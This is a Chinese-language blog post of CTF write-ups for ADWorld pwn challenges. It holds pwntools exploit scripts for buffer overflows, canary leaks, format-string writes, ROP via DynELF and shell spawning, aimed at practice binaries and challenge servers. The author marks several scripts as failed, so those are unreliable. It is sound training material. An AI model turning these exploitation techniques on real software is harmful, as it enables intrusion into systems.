---
title: "ADWorld 1"
date: 2021-08-03T14:16:54+08:00
draft: false
---


# forgot

```jsx
from pwn import *
context.log_level='debug'
#sentence 32   00000074
#_DWORD v3[10]   00000054
#hackme 080486CC

#v5=1
#sentence='{*'

#p=process('./forgot')
p=remote('111.200.241.244',49781)
payload=b'{'*32+p32(0x080486CC)

p.sendlineafter('name','vincebye')
p.sendlineafter('validate',payload)
p.interactive()
```

找到溢出点→覆盖已有的函数

# 未果01-Mary_Morton

看起来是有两个漏洞入口可以攻击

```c
__int64 sub_4008EB()
{
  char buf; // [sp+0h] [bp-90h]@1
  __int64 v2; // [sp+88h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x7FuLL);
  printf(&buf, &buf);
  return *MK_FP(__FS__, 40LL) ^ v2;
}

.text:00000000004008EB ; =============== S U B R O U T I N E =======================================
.text:00000000004008EB
.text:00000000004008EB ; Attributes: bp-based frame
.text:00000000004008EB
.text:00000000004008EB sub_4008EB      proc near               ; CODE XREF: main+8Dp
.text:00000000004008EB
.text:00000000004008EB buf             = byte ptr -90h
.text:00000000004008EB var_8           = qword ptr -8
.text:00000000004008EB
.text:00000000004008EB                 push    rbp
.text:00000000004008EC                 mov     rbp, rsp
.text:00000000004008EF                 sub     rsp, 90h
.text:00000000004008F6                 mov     rax, fs:28h
.text:00000000004008FF                 mov     [rbp+var_8], rax
.text:0000000000400903                 xor     eax, eax
.text:0000000000400905                 lea     rdx, [rbp+buf]
.text:000000000040090C                 mov     eax, 0
.text:0000000000400911                 mov     ecx, 10h
.text:0000000000400916                 mov     rdi, rdx
.text:0000000000400919                 rep stosq
.text:000000000040091C                 lea     rax, [rbp+buf]
.text:0000000000400923                 mov     edx, 7Fh        ; nbytes
.text:0000000000400928                 mov     rsi, rax        ; buf
.text:000000000040092B                 mov     edi, 0          ; fd
.text:0000000000400930                 call    _read
.text:0000000000400935                 lea     rax, [rbp+buf]
.text:000000000040093C                 mov     rdi, rax        ; format
.text:000000000040093F                 mov     eax, 0
.text:0000000000400944                 call    _printf
.text:0000000000400949                 nop
.text:000000000040094A                 mov     rax, [rbp+var_8]
.text:000000000040094E                 xor     rax, fs:28h
.text:0000000000400957                 jz      short locret_40095E
.text:0000000000400959                 call    ___stack_chk_fail
```

```c
__int64 sub_400960()
{
  char buf; // [sp+0h] [bp-90h]@1
  __int64 v2; // [sp+88h] [bp-8h]@1

  v2 = *MK_FP(__FS__, 40LL);
  memset(&buf, 0, 0x80uLL);
  read(0, &buf, 0x100uLL);
  printf("-> %s\n", &buf);
  return *MK_FP(__FS__, 40LL) ^ v2;
}

.text:0000000000400960 ; =============== S U B R O U T I N E =======================================
.text:0000000000400960
.text:0000000000400960 ; Attributes: bp-based frame
.text:0000000000400960
.text:0000000000400960 sub_400960      proc near               ; CODE XREF: main+81p
.text:0000000000400960
.text:0000000000400960 buf             = byte ptr -90h
.text:0000000000400960 var_8           = qword ptr -8
.text:0000000000400960
.text:0000000000400960                 push    rbp
.text:0000000000400961                 mov     rbp, rsp
.text:0000000000400964                 sub     rsp, 90h
.text:000000000040096B                 mov     rax, fs:28h
.text:0000000000400974                 mov     [rbp+var_8], rax
.text:0000000000400978                 xor     eax, eax
.text:000000000040097A                 lea     rdx, [rbp+buf]
.text:0000000000400981                 mov     eax, 0
.text:0000000000400986                 mov     ecx, 10h
.text:000000000040098B                 mov     rdi, rdx
.text:000000000040098E                 rep stosq
.text:0000000000400991                 lea     rax, [rbp+buf]
.text:0000000000400998                 mov     edx, 100h       ; nbytes
.text:000000000040099D                 mov     rsi, rax        ; buf
.text:00000000004009A0                 mov     edi, 0          ; fd
.text:00000000004009A5                 call    _read
.text:00000000004009AA                 lea     rax, [rbp+buf]
.text:00000000004009B1                 mov     rsi, rax
.text:00000000004009B4                 mov     edi, offset format ; "-> %s\n"
.text:00000000004009B9                 mov     eax, 0
.text:00000000004009BE                 call    _printf
.text:00000000004009C3                 nop
.text:00000000004009C4                 mov     rax, [rbp+var_8]
.text:00000000004009C8                 xor     rax, fs:28h
.text:00000000004009D1                 jz      short locret_4009D8
.text:00000000004009D3                 call    ___stack_chk_fail
```

程序保护机制状态

```c
[*] '/home/vincebye/ctf/adworld1/1'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    **Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

一个格式化字符串漏洞，一个溢出漏洞，查了一点资料应该是根据格式化字符串漏洞泄露出canary的地址，然后进行覆盖修改，可是我还是不会啊，每一题都是看答案的，怎么办

刚开始在栈视图里找不到canary参数的存在，后面看了一下，在汇编中，var_8就是canary,rename了一下

```c
-0000000000000090 buf             db ?
-000000000000008F                 db ? ; undefined
-000000000000008E                 db ? ; undefined
-000000000000008D                 db ? ; undefined
-000000000000008C                 db ? ; undefined
-000000000000008B                 db ? ; undefined
...
...
-000000000000000D                 db ? ; undefined
-000000000000000C                 db ? ; undefined
-000000000000000B                 db ? ; undefined
-000000000000000A                 db ? ; undefined
-0000000000000009                 db ? ; undefined
-0000000000000008 canary          dq ?
```

在栈中，buf参数与canary参数相差17

又我们在格式化字符串漏洞路径输入AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p,看一下AAAAAAAA在printf输出参数的第几个参数

```c
pwndbg> r
Starting program: /home/vincebye/ctf/adworld1/1 
Welcome to the battle ! 
[Great Fairy] level pwned 
Select your weapon 
1. Stack Bufferoverflow Bug 
2. Format String Bug 
3. Exit the battle 
2
AAAAAAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
AAAAAAAA-0x7fffffffde90-0x7f-0x7ffff7af2151-(nil)-(nil)-0x4141414141414141-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0x252d70252d70252d-0x2d70252d70252d70-0x70252d70252d7025-0xa70252d70252d-(nil)-(nil)-(nil)-(nil)-(nil)
```

可得为第六个参数，则我们通过输入%23$p就可以得到canary的参数

```python
from pwn import *
p=process('1')

#GetCanary
payload='%23$p'
p.sendlineafter('battle\n','2')
p.sendline(payload)
```

接下来需要溢出，然后执行函数还要覆盖canary，但是好像也不知道怎么看溢出参数,栈视图与格式化字符串的一致，一般来说canary后面就是EBP了，就按这个算吧

```python
from pwn import *
#p=process('1')
p=remote('111.200.241.244','63130')
#GetCanary
payload='%23$p'
a=p.recvuntil('Exit the battle \n')
print(a)
p.sendline(b'2')
print('send:2')
p.sendline(payload)
print('send:payload')
canary=p.recv(16,timeout=8)
print(canary)
canary=canary.decode(encoding='utf-8')
canary=int(canary,16)
print(canary)
print(hex(canary))
#Overflow
payload=b'a'*0x88+p64(canary)+b'BBBBBBBB'+p64(0x00000000004008E3)
print(p64(canary))
p.sendlineafter('Exit the battle \n','1')
print('1')
p.sendline(payload)
p.interactive()
```

我也不知道为什么我和人家一模一样都错了，调试了一晚上，浪费了一晚上时间，算了

```python
vincebye@ubuntu:~/ctf/adworld1/Mary_Morton$ python3 2.py 
[+] Opening connection to 111.200.241.244 on port 63130: Done
b'Welcome to the battle ! \n[Great Fairy] level pwned \nSelect your weapon \n1. Stack Bufferoverflow Bug \n2. Format String Bug \n3. Exit the battle \n'
send:2
send:payload
b'0x8df273a9386430'
39954550290408496
0x8df273a9386430
b'0d8\xa9s\xf2\x8d\x00'
1
[*] Switching to interactive mode
-> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa0d8\xa9s\xf2\x8d
$                                                                                                                                                   *** stack smashing detected ***: ./mary_morton terminated
[*] Got EOF while reading in interactive
$
```

# 12-Monkey

是一个JS的解释器，带了3个so文件，完全没有弄过，直接看答案吧

一个JSshell，看到多个文件，第一时间想到放IDA里看代码，其实这个应该是看JS shell是否可以执行系统命令

```python
vincebye@ubuntu:~/ctf/adworld1/monkey$ nc 111.200.241.244 51509
js> os.system(bash)  
os.system(bash)
js> os.system('bin/sh')
os.system('bin/sh')
ls
bin
dev
flag
js
lib
lib32
lib64
libnspr4.so
libplc4.so
libplds4.so
run.sh
cat flag
cyberpeace{9510da9cf0f4d01b6bacfca44b688f6f}
```

# Pwn-100

函数清单

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/be98e720-7773-4cd3-8c9f-2fc16e36e518/Untitled.png)

虽然有NX保护，但是直接写入shell看看

```python
from pwn import *
p = process("./pwn100")
# p = remote("111.198.29.45","49404")
#context(arch='amd64', os='linux', log_level='debug')
context.binary = './pwn100'

payload=b'a'*72
shellcode = asm(shellcraft.sh())
payload+=payload+shellcode
p.sendline(payload)
p.interactive()
```

果然不行，程序里没有system函数，没有/bin/sh字符串，该如何拿到flag呢？,看答案

## 方法一：LibcSearch

首先，查找一下gadgets

```python
vincebye@ubuntu:~/ctf/adworld1/pwn-100$ ROPgadget --binary pwn100 --only "pop|ret" |grep rdi
0x0000000000400763 : pop rdi ; ret
```

```python
from pwn import *
from LibcSearcher import *

p=process('pwn100')
elf=ELF('pwn100')
read_got=elf.got['read']
#main_addr=elf.sym['main'] KeyError: 'main'
main_addr=0x00000000004006B8
puts_addr=elf.sym['puts']
pop_rdi_ret=0x0000000000400763 

payload=72*b'a'+p64(pop_rdi_ret)+p64(read_got)+p64(puts_addr)+p64(main_addr) #并没有报错，需要一个总量
payload=payload.ljust(200,b'b')
#不是很理解这里为什么sym地址也需要在后面添加返回地址
p.send(payload)
read_got_addr=p.recv()
print(read_got_addr)
if b'\n' in read_got_addr:
  read_got_addr=read_got_addr.split(b'\n')[1]
elif read_got_addr[-2:]==b'\n':
  read_got_addr=read_got_addr[:-2]
  print(3)
  print(read_got_addr)
print(read_got_addr)
read_got_addr=read_got_addr.split(b'\x')[1]
print('test')
print(read_got_addr)
#补充8字节大小
read_got_addr=read_got_addr.ljust(8,b'\x00')
read_got_addr=u64(read_got_addr)

#Libc数据库查询
obj=LibcSearcher("read",read_got_addr)#这个传参得是十进制的吗？
print('3')
#获取libc_base
libc_base=read_got_addr-obj.dump('read')
print('4')
#获取system地址
system_addr=libc_base+obj.dump('system')
print('5')

#获取/bin/sh地址
bin_addr=libc_base+obj.dump('str_bin_sh')
print('6')

print(bin_addr)

No matched libc, please add more libc or try others
```

No matched libc, please add more libc or try others

不太行，而且好像传输过程中有一些奇怪的字符

## 方法二：利用DynELF

利用DynELF函数

```python
from pwn import *

context.terminal = ['terminator','-x','sh','-c']
p=process('pwn100')
elf=ELF('pwn100')

puts_plt_addr=elf.plt['puts']
pop_rdi_ret=0x0000000000400763 
#main_addr=0x00000000004006B8
main_addr=0x400550

def leak(address):
    payload=b'a'*0x48+p64(pop_rdi_ret)+p64(address)+p64(puts_plt_addr)+p64(main_addr)
    payload=payload.ljust(0xc8,b'b')
    p.send(payload)
    p.recvuntil(b'bye~\n')
    up=b''
    data=b''
    while True:
        c=p.recv(numb=1,timeout=0.1)
        if up==b'\n' and c==b'':
            data=data[:-1]
            data+=b'\x00'
            break
        else:
            data+=c
        up=c
    data=data[:4]
    return data

dyn=DynELF(leak,elf=ELF('pwn100'))
sys_addr=dyn.lookup('system','libc')
print(sys_addr)

bss_addr=elf.bss()
#bss_addr=0x0000000000601050
read_plt_addr=elf.plt['read']
read_got_addr=elf.got['read']

#ret2rsu
pop_6_addr=0x000000000040075A
mov_rdx_r13=0x0000000000400740

payload=b'a'*0x48+p64(pop_6_addr)+p64(0)+p64(1)+p64(read_got_addr)+p64(8)+p64(bss_addr+0x10)+p64(0)
payload+=p64(mov_rdx_r13)+b'c'*56
payload+=p64(main_addr)
payload=payload.ljust(0xc8,b'\x00')
p.send(payload)
p.send(b'/bin/sh\x00')

payload=b'a'*0x48+p64(pop_rdi_ret)+p64(bss_addr+0x10)+p64(sys_addr)
payload=payload.ljust(0xc8,b'\x00')
p.send(payload)
p.interactive()
```

## 重要结论:本地失败了请直接尝试云端环境

一直在调试本地，不知道为什么一直失败，想着是代码问题，后面直接用他的云端环境，一下子就成功了，就无语

# 反应釜开关控制

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [sp+0h] [bp-240h]@1
  char v5; // [sp+40h] [bp-200h]@1

  write(1, "Please closing the reaction kettle\n", 0x23uLL);
  write(1, "The switch is:", 0xEuLL);
  sprintf(&s, "%p\n", easy);
  write(1, &s, 9uLL);
  write(1, ">", 2uLL);
  gets(&v5, ">");
  return 0;
}
```

一运行直接到gets了，想不到该怎么Pwn,看答案

Gets函数的溢出，直接可以覆盖RIP，跳转到我们想要执行的地址

溢出字符多试试

```c
from pwn import * 
sh=process('./fyf')
sh=remote('111.198.29.45',36983)
elf=ELF('./fyf')
getshell_addr=elf.sym['shell']
payload=b'a'*0x208+p64(getshell_addr)
sh.sendlineafter('>',payload)
sh.interactive()
```

# 实时数据检测

```c
pwndbg> r
Starting program: /home/vincebye/ctf/adworld1/datamo/datamo 
AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
AAAA-0xf7feade0-0xf7e4511b-(nil)-0xf7fb7000-(nil)-0xffffd0d8-0x80484e7-0xffffced0-0x200-0xf7fb75c0-0xf7fda19b-0x41414141-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-0x252d7025-0x70252d70-0xc3000a-(nil)-0xf7ffd000-(nil)-(nil)-(nil)-0x1a59e700-0x9-0xffffd34d-0xf7e0f589-0xf7fba808-0xf7fb7000-0xf7fb7000-(nil)-0xf7e0f6eb-0xf7fb73fc-(nil)-(nil)-0x804859b-0x1-0xffffd194-0xffffd0e8-0x804853c-0xf7fe5970
The location of key is 0804a048, and its value is 00000000,not the 0x02223322. (╯°Д°)╯︵ ┻━┻
```

很明显，可以根据printf字符串格式化漏洞，在0804a048处写入0x02223322，AAAA在偏移12的地方

那尝试一下这个payload

```c
0804a048-%35795746c%12%n
```

失败了，不知道如何指定地址，AAAA对应0x41414141，但是不知怎么弄出0x0804a048

看了答案总结几个失败点

- 手动输入H\xa0\x040和用代码发送结果不一样，手动输入是按照字符串解析的，下次优先按照代码
- pwntool库里有一个fmtstr_payload函数，学习一下

```c
####################################
from pwn import *
io = process("./datamo")
io=remote('111.200.241.244','56461')
key_addr = 0x0804A048
#gdb.attach(io,"b *0x0804849B")
buf = p32(key_addr)+b"%035795742d"+b"%12$n"
#buf=p32(key_addr)+b'%12$p'
io.sendline(buf)
io.interactive()
#####################################
from pwn import *
p=process("./datamo")
key_addr=0x0804A048
value=0x02223322
offset=12
payload=fmtstr_payload(offset,{key_addr:value})
p.sendline(payload)
p.interactive()
```

# dice_game

程序的流程是：连续50次猜中随机数，在其中没有发现可利用函数，看答案

不知道为什么第一次并没有看到栈中buf和sand数值

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/77e5d7e0-52fd-420f-86fe-a942ef6b7b15/Untitled.png)

学会看IDA自动生成的注释，在这里buf是[ESP+0h],而是seed在[ESP+40h]处，~~相差40个字节相差~~，相差0x40字节，这样我们就看看一利用buf覆盖掉seed

```c
from pwn import *
from ctypes import *
context.log_level='debug'
p=process('dice_game')
p=remote('','')
payload=b'a'*0x40+b'A'*4
p.recvuntil('Welcome, let me know your name:')
p.sendline(payload)

libc=cdll.LoadLibrary('libc.so.6')
libc.srand(0x41414141)
for i in range(50):
    p.recvuntil('Give me the point(1~6):')
    num=(libc.rand()%6+1)
    p.sendline(str(num))
p.interactive()

```

PS：H表示16进制

# 未果Stack2

感觉环境有问题

# 未果Recho

修改GOT表

# welpwn

此题看答案之后苦思良久，豁然开朗，对于函数调用过程中的寄存器变化还是不太熟悉

main函数

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char buf; // [sp+0h] [bp-400h]@1

  write(1, "Welcome to RCTF\n", 0x10uLL);
  fflush(_bss_start);
  read(0, &buf, 0x400uLL);
  echo((__int64)&buf);
  return 0;
}
```

buf最多可接收0x400字节数据

echo函数

```c
int __fastcall echo(__int64 a1)
{
  char s2[16]; // [sp+10h] [bp-10h]@2

  for ( i = 0; *(_BYTE *)(i + a1); ++i )
    s2[i] = *(_BYTE *)(i + a1);
  s2[i] = 0;
  if ( !strcmp("ROIS", s2) )
  {
    printf("RCTF{Welcome}", s2);
    puts(" is not flag");
  }
  return printf("%s", s2);
}
```

这里s2是个char型数组，最多存储16个字符数据，然而后面并没有对赋值的参数的个数进行限制，所以在这里可以进行溢出，而在for循环的可知一旦遇到\x00字符就会停止赋值，这时我们需要想象一下栈中的数据布局来构造payload

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e38cb0bd-1a68-420d-a68f-cbefe6b8db7c/Untitled.png)

首先必须明确几点：

- 普通数据类似于A这种代码为0x41不含\x00的不会触发停止赋值，像函数地址类似pop_rdi这种必定含有0x00xxxx的一定会触发停止赋值的操作
- Echo函数栈的值都是从buf数据区赋值而来，所以与buf数据区32字节数据相等

这时若是类似pop_rdi这种指令，RIP跳入AAAAAAAA就会触发错误，所以在这里就需要一个跳过32字节的命令，好使我们的RIP可以直接从buf区中有效指令开始运行

```c
.text:0000000000400896 loc_400896:                             ; CODE XREF: __libc_csu_init+36j
.text:0000000000400896                 add     rsp, 8
.text:000000000040089A                 pop     rbx
.text:000000000040089B                 pop     rbp
.text:000000000040089C                 pop     r12
.text:000000000040089E                 pop     r13
.text:00000000004008A0                 pop     r14
.text:00000000004008A2                 pop     r15
.text:00000000004008A4                 retn
.text:00000000004008A4 __libc_csu_init endp
```

所需的pop_32个字节的指令0x000000000040089C

然后利用DynELF进行求解

# 未果greeting-150

每篇WP要看好几天也不知道咋办

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@2
  int v4; // edx@4
  int v5; // [sp+1Ch] [bp-84h]@2
  int v6; // [sp+5Ch] [bp-44h]@1
  int v7; // [sp+9Ch] [bp-4h]@1

  v7 = *MK_FP(__GS__, 20);
  printf("Please tell me your name... ");
  if ( getnline((char *)&v6, 64) )
  {
    sprintf((char *)&v5, "Nice to meet you, %s :)\n", &v6);
    result = printf((const char *)&v5);
  }
  else
  {
    result = puts("Don't ignore me ;( ");
  }
  v4 = *MK_FP(__GS__, 20) ^ v7;
  return result;
}
```

在14行处存在一个格式化字符串漏洞

```c
size_t __cdecl getnline(char *s, int n)
{
  char *v3; // [sp+1Ch] [bp-Ch]@1

  fgets(s, n, stdin);
  v3 = strchr(s, 10);
  if ( v3 )
    *v3 = 0;
  return strlen(s);
}
```

暂定思路getnline中的s是我们可控的，我们劫持strlen的GOT表，将其修改成system，然后传入/bin/sh,问题是：代码不在一个循环中，我们劫持完之后，代码后续直接return结束了，无法再传入/bin/sh，因此我们要让他结束之后重新运行一遍main

> 在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main
函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针
> 

> 分析了__libc_csu_fini函数的执行流程，简单来说就是执行fini_array数组的内容，先执行fini_array[1]接着执行fini_array[0]
> 

修改.fini_array段中的指针地址，让他不会直接结束

查看一下printf的输出偏移

```c
vincebye@ubuntu:~/ctf/adworld1/greeting150$ greeting150 
Hello, I'm nao!
Please tell me your name... AABBBBCCCC-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p
Nice to meet you, AABBBBCCCC-0x80487d0-0xff959e0c-(nil)-(nil)-(nil)-(nil)-0x6563694e-0x206f7420-0x7465656d-0x756f7920-0x4141202c-0x42424242-0x43434343-0x2d70252d-0x252d7025-0x70252d70-0x2d70252d-% :)
```

因为Nice to meet you,占用18字节大小，所以我们加了个AA补位，让他对齐，后续的输入是从第12个参数开始的

```c
System

GOT:extern:08049AE4 ; int system(const char *command)

PLT:tomori:08048779 call _system

_start .text:080484F0

extern:08049AEC ; size_t strlen(const char *s)

.fini_array:08049934 _fini_array     segment dword public 'DATA' use32
```

- 劫持strlen函数的GOT表为system
- 修改fini_array第一个元素为start函数，实现循环
- 第二次循环的时候输入/bin/sh，拿到shell

# 未果pwn-200

0804A058 write

```c
ssize_t sub_8048484()
{
  char buf; // [sp+1Ch] [bp-6Ch]@1

  setbuf(stdin, &buf);
  return read(0, &buf, 0x100u);
}
```

感觉思路就是利用的DynELF

```c
vincebye@ubuntu:~/ctf/adworld1/pwn200$ readelf -S pwn200 
There are 28 section headers, starting at offset 0x1134:

Section Headers:
  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al
  [ 0]                   NULL            00000000 000000 000000 00      0   0  0
  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1
  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4
  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4
  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 00002c 04   A  5   0  4
  [ 5] .dynsym           DYNSYM          080481d8 0001d8 000090 10   A  6   1  4
  [ 6] .dynstr           STRTAB          08048268 000268 000064 00   A  0   0  1
  [ 7] .gnu.version      VERSYM          080482cc 0002cc 000012 02   A  5   0  2
  [ 8] .gnu.version_r    VERNEED         080482e0 0002e0 000020 00   A  6   1  4
  [ 9] .rel.dyn          REL             08048300 000300 000018 08   A  5   0  4
  [10] .rel.plt          REL             08048318 000318 000028 08   A  5  12  4
  [11] .init             PROGBITS        08048340 000340 00002e 00  AX  0   0  4
  [12] .plt              PROGBITS        08048370 000370 000060 04  AX  0   0 16
  [13] .text             PROGBITS        080483d0 0003d0 00024c 00  AX  0   0 16
  [14] .fini             PROGBITS        0804861c 00061c 00001a 00  AX  0   0  4
  [15] .rodata           PROGBITS        08048638 000638 000008 00   A  0   0  4
  [16] .eh_frame_hdr     PROGBITS        08048640 000640 00003c 00   A  0   0  4
  [17] .eh_frame         PROGBITS        0804867c 00067c 0000ec 00   A  0   0  4
  [18] .ctors            PROGBITS        08049f14 000f14 000008 00  WA  0   0  4
  [19] .dtors            PROGBITS        08049f1c 000f1c 000008 00  WA  0   0  4
  [20] .jcr              PROGBITS        08049f24 000f24 000004 00  WA  0   0  4
  [21] .dynamic          DYNAMIC         08049f28 000f28 0000c8 08  WA  6   0  4
  [22] .got              PROGBITS        08049ff0 000ff0 000004 04  WA  0   0  4
  [23] .got.plt          PROGBITS        08049ff4 000ff4 000020 04  WA  0   0  4
  [24] .data             PROGBITS        0804a014 001014 000008 00  WA  0   0  4
  [25] .bss              NOBITS          0804a020 00101c 00002c 00  WA  0   0 32
  [26] .comment          PROGBITS        00000000 00101c 00002a 01  MS  0   0  1
  [27] .shstrtab         STRTAB          00000000 001046 0000ec 00      0   0  1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  p (processor specific)
```

```c
from pwn import *
context.terminal = ['terminator','-x','sh','-c']
p=process('pwn200')
elf=ELF('pwn200')

write_plt=elf.plt['write']
vul_func=0x8048484
bss_addr=0x0804a020

def leak(address):
    payload=b'a'*0x6c+p32(write_plt)+p32(vul_func)+p32(1)+p32(address)+p32(4)
    payload=payload.ljust(0x100,b'b')
    p.send(payload)
    data=p.recv(4)
    return data

dyn=DynELF(leak,elf=ELF('pwn200'))
sys_addr=dyn.lookup('system','libc')
print(sys_addr)
payload=b'a'*0x6c+p32(sys_addr)+p32(vul_func)+p32('/bin/sh\x00')
payload=payload.ljust(0x100,b'b')
p.send(payload)
p.interactive()
```

写的代码一点反应都没有，看看哪里错了吧

- 利用read函数将/bin/sh写入bss_addr
- read函数后需要接上pop pop pop ret来平衡堆栈

# 未果pwn1

# 未果note-service2

# 未果supermarket

[攻防世界supermarket_I still ...的博客-CSDN博客](https://blog.csdn.net/qq_44370676/article/details/108229050)

# 参考资料